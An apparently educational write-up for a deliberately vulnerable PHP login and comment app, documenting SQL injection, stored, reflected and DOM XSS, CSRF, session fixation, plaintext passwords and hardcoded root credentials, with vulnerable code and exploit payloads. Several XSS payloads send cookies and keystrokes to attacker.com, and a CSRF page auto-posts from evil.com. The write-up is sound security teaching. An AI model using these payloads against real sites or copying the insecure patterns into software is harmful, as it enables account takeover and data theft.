# ⚠️ Insecure Version — Vulnerability Writeup

> **Warning:** This application is intentionally vulnerable. It exists purely for educational demonstration of common web security vulnerabilities. **Never deploy this in production or on a public-facing server.**

---

## Overview

This is the vulnerable baseline version of the PHP web application. It was built first — intentionally omitting all security controls — to create a realistic attack surface. Every vulnerability listed below was confirmed exploitable with a working proof-of-concept before fixes were applied in the [secure version](../secure/).

### Files

| File | Purpose |
|------|---------|
| `index.php` | Login page — raw SQL, no sanitisation |
| `register.php` | Registration — plaintext passwords, injectable INSERT |
| `welcome.php` | Comment board — stored XSS, DOM XSS, reflected XSS |
| `config.php` | Database config — hardcoded root/no-password credentials |
| `logout.php` | Session destroy only — no CSRF, no token |
| `demo.php` | Proof-of-concept exploit showcase |

---

## Vulnerabilities

---

### 1. SQL Injection — Authentication Bypass

**File:** `index.php`  
**Severity:** 🔴 CRITICAL  
**OWASP:** A03:2021 — Injection

#### Vulnerable Code

```php
$email    = $_POST['email'];
$password = $_POST['password'];

$sql    = "SELECT * FROM users WHERE email='$email' AND password='$password'";
$result = mysqli_query($conn, $sql);
```

#### Exploit

Submit the following as the email field with any password:

```
admin' -- -
```

This transforms the SQL query into:

```sql
SELECT * FROM users WHERE email='admin' -- -' AND password='anything'
```

The `-- -` comments out the password check entirely. The query returns the first user record unconditionally, granting full authentication bypass without knowing any valid password.

#### Impact

Complete authentication bypass. An attacker can log in as any user — including administrators — without knowing their password.

---

### 2. SQL Injection — Registration

**File:** `register.php`  
**Severity:** 🔴 CRITICAL  
**OWASP:** A03:2021 — Injection

#### Vulnerable Code

```php
// Duplicate email check — injectable
$sql = "SELECT * FROM users WHERE email='$email'";

// INSERT — all three fields injectable
$sql = "INSERT INTO users (username, email, password)
        VALUES ('$username', '$email', '$password')";
```

#### Exploit

All three registration fields are injectable. A specially crafted username or email can:
- Bypass the duplicate-email check using `' OR '1'='1`
- Inject additional SQL rows or commands via a malicious INSERT payload
- Exfiltrate or modify existing records using UNION-based payloads

---

### 3. Stored XSS — Comment Board

**File:** `welcome.php`  
**Severity:** 🔴 HIGH  
**OWASP:** A03:2021 — Injection (XSS)

#### Vulnerable Code

```php
// All three fields echoed without encoding
echo $row['name'];
echo $row['email'];
echo $row['comment'];
```

#### Exploit

Post the following as a comment (Name, Email, or Comment field):

```html
<script>
  document.location='https://attacker.com/steal?c='+document.cookie
</script>
```

The payload is stored in the database. Every user who subsequently loads the comments page executes the script in their browser — enabling **mass session hijacking** with a single posted comment.

#### More payloads to test

```html
<!-- Deface the page -->
<script>document.body.innerHTML='<h1 style="color:red">HACKED</h1>'</script>

<!-- Steal cookies -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- Keylogger -->
<script>document.onkeypress=e=>fetch('https://attacker.com/?k='+e.key)</script>
```

#### Impact

Persistent payload executes for every visitor. One post can compromise every active session on the site.

---

### 4. Reflected XSS — Login Email Field

**File:** `index.php`  
**Severity:** 🔴 HIGH  
**OWASP:** A03:2021 — Injection (XSS)

#### Vulnerable Code

```php
// Email value echoed back into form without encoding
<input type="text" name="email"
  value="<?php echo $_POST['email']; ?>">

// Password also echoed — double exposure
<input type="password" name="password"
  value="<?php echo $_POST['password']; ?>">
```

#### Exploit

Craft and distribute this URL:

```
http://target.com/index.php?email="><script>alert(document.cookie)</script>
```

When a victim clicks the link, the server renders:

```html
<input type="text" name="email" value=""><script>alert(document.cookie)</script>">
```

The injected script executes in the victim's browser in the context of the application's origin.

**Bonus:** The password is also echoed back into the HTML — any plaintext password entered during a failed login is visible in the page source.

---

### 5. DOM-Based XSS — Quick Search

**File:** `welcome.php`  
**Severity:** 🔴 HIGH  
**OWASP:** A03:2021 — Injection (XSS)

#### Vulnerable Code

```javascript
function quickSearch() {
    var searchTerm = document.getElementById('quickSearch').value;
    // Raw input written directly to DOM — no sanitisation
    document.getElementById('quickSearchOutput').innerHTML = searchTerm;
}
```

#### Exploit

Type or paste into the Quick Search box:

```html
<img src=x onerror=alert('DOM XSS!')>
```

The script executes **entirely client-side** — no server request needed, no server-side filtering can prevent it. The payload can also be delivered via URL fragment:

```
http://target.com/welcome.php#<img src=x onerror=alert(1)>
```

#### Impact

Client-side script execution without any server interaction. Cannot be blocked by WAF or server-side filters.

---

### 6. Reflected XSS — ?test GET Parameter

**File:** `welcome.php`  
**Severity:** 🔴 HIGH

#### Vulnerable Code

```php
<h1>💬 Interactive Comment System <?php echo $_GET['test'] ?? ''; ?></h1>
```

#### Exploit

```
http://target.com/welcome.php?test=<script>alert(document.cookie)</script>
```

The parameter is echoed directly into the `<h1>` tag with no encoding. Trivial to exploit via shared link.

---

### 7. Plaintext Password Storage

**File:** `register.php`  
**Severity:** 🔴 CRITICAL  
**OWASP:** A02:2021 — Cryptographic Failures

#### Vulnerable Code

```php
$password = $_POST['password'];

$sql = "INSERT INTO users (username, email, password)
        VALUES ('$username', '$email', '$password')";
```

Passwords are stored **exactly as typed** — no hashing, no salting, no encoding. The login also compares them inside the SQL query itself:

```php
$sql = "SELECT * FROM users WHERE email='$email' AND password='$password'";
```

#### Impact

Any database breach — via SQL injection (vulnerability 1 above), direct server access, or accidental backup exposure — immediately reveals every user's plaintext password. Since users reuse passwords across sites, this cascades into account compromise on Gmail, banks, and other services.

---

### 8. No CSRF Protection

**File:** All forms  
**Severity:** 🟠 HIGH  
**OWASP:** A01:2021 — Broken Access Control

#### Vulnerable Code

```html
<!-- No hidden CSRF token anywhere in any form -->
<form action="" method="POST">
    <input type="text" name="username">
    ...
    <button name="submit">Register</button>
</form>
```

#### Exploit

An attacker hosts a page at `evil.com` containing:

```html
<form id="csrf" action="http://target.com/welcome.php" method="POST">
    <input name="name" value="Attacker">
    <input name="email" value="attacker@evil.com">
    <input name="comment" value="<script>alert(document.cookie)</script>">
    <input name="submit" value="1">
</form>
<script>document.getElementById('csrf').submit();</script>
```

When a logged-in user visits `evil.com`, the form auto-submits to the target app. Because the browser includes the session cookie automatically, the comment is posted as the victim without their knowledge.

---

### 9. Missing Session Hardening

**File:** All PHP files  
**Severity:** 🟠 HIGH

#### Issues

```php
// No security directives — bare session_start()
session_start();

// No session_regenerate_id() on login
// Session ID never changes — session fixation possible

// Cookie sent over HTTP — sniffable on public WiFi
// No httponly — JavaScript can read session cookie
// No samesite — cross-site requests carry cookie
```

#### Session Fixation Attack

1. Attacker obtains a valid session ID (e.g., by visiting the site)
2. Attacker tricks victim into using that session ID (via link or XSS)
3. Victim logs in — the attacker's known session ID is now authenticated
4. Attacker uses the same session ID to access the victim's account

---

### 10. Hardcoded Database Credentials

**File:** `config.php`  
**Severity:** 🟡 MEDIUM

#### Vulnerable Code

```php
$server   = "localhost";
$username = "root";        // root access
$password = "";            // no password
$database = "login_register";
```

Root with no password. If this file is exposed via misconfigured directory listing, version control push, or server misconfiguration, the entire database is immediately accessible.

---

## Summary

| Vulnerability | CVE Class | OWASP | Impact |
|--------------|-----------|-------|--------|
| SQL Injection (login) | CWE-89 | A03 | Auth bypass, data theft |
| SQL Injection (register) | CWE-89 | A03 | Data manipulation |
| Stored XSS | CWE-79 | A03 | Session hijack at scale |
| Reflected XSS (email) | CWE-79 | A03 | Session hijack per victim |
| DOM XSS | CWE-79 | A03 | Client-side execution |
| Reflected XSS (?test) | CWE-79 | A03 | Script injection via URL |
| Plaintext passwords | CWE-256 | A02 | Full credential exposure |
| No CSRF | CWE-352 | A01 | Forged actions as victim |
| Session fixation | CWE-384 | A07 | Account takeover |
| Hardcoded creds | CWE-798 | A05 | DB access on file exposure |

---

See [`/secure`](../secure/) for the full remediation of every issue above.
